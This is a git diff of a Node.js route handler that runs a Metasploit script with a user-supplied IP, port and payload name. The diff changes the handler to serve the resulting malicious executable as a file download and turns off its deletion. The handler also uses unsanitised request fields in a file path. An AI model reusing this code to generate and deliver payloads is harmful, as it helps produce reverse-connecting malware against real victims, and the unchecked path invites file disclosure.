@@ -1,15 +1,14 @@
 var shell = require("shelljs");
 var process = require("process");
+const fs = require("fs");
 
 //exname is the name of malicious executable in metasploit.sh
 //spayload is the send payload option
 var metasploit = async (req, res) => {
-  var { ip, port, exname } = req.body;
-  var { spayload } = req.body;
-  if (spayload === "") {
-    spayload = "n";
-  }
-  var meta = shell.exec(
+  var { ip, port, payload } = req.body;
+  let output = "";
+
+  let meta = shell.exec(
     `${process.cwd()}/scripts/metasploit.sh`,
     (error, stdout, stderr) => {
       console.log(stdout);
@@ -18,16 +17,35 @@ var metasploit = async (req, res) => {
         res.status(400);
         return res.json({ status: "error", error: stderr });
       } else {
-        res.status(200);
-        res.json({ status: "ok", output: stdout });
+        const filePath = `${process.cwd()}/${payload}.exe`; // or any file format
+
+        // Check if file specified by the filePath exists
+        fs.exists(filePath, (exists) => {
+          if (exists) {
+            // Content-type is very interesting part that guarantee that
+            // Web browser will handle response in an appropriate manner.
+            res.writeHead(200, {
+              "Content-Type": "application/octet-stream",
+              "Content-Disposition": "attachment; filename=" + payload,
+            });
+            fs.createReadStream(filePath).pipe(res);
+
+            return;
+          }
+          res.writeHead(400, { "Content-Type": "text/plain" });
+          res.end("ERROR File does not exist");
+        });
       }
     }
   );
   meta.stdin.write(`${ip} \n`);
   meta.stdin.write(`${port} \n`);
-  meta.stdin.write(`${exname} \n`);
-  meta.stdin.write(`${spayload} \n`);
-  shell.rm(`${exname}.exe`);
+  meta.stdin.write(`${payload} \n`);
+  // try {
+  //   shell.rm(`${payload}.exe`);
+  // } catch (err) {
+  //   console.error(err);
+  // }
 };
 
 module.exports = metasploit;
